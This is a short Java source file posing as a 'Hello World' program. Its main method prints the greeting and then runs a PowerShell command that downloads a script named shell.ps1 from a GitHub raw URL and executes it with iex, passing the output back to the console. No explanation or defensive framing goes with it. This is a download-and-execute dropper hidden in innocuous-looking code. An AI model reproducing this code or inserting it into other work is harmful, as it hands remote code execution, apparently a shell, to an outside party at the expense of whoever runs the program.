import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class main {

    public static void main(String[] args) {
        // Ausgabe Hello World!
        System.out.println("Hello World!");

        String command = "powershell.exe -nop -c iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/itssixtyn3in/upload/main/shell.ps1')";

        try {
            Process process = Runtime.getRuntime().exec(command);

            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            BufferedReader errorReader = new BufferedReader(
                    new InputStreamReader(process.getErrorStream()));
            while ((line = errorReader.readLine()) != null) {
                System.out.println(line);
            }
            errorReader.close();
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
